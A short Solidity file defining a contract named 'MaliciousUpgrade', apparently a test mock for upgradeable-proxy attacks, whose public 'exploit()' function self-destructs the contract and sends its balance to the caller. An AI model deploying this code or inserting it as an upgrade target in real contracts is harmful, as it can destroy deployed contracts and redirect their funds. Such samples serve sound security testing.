// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract MaliciousUpgrade {
    function exploit() public {
        selfdestruct(msg.sender);
    }
}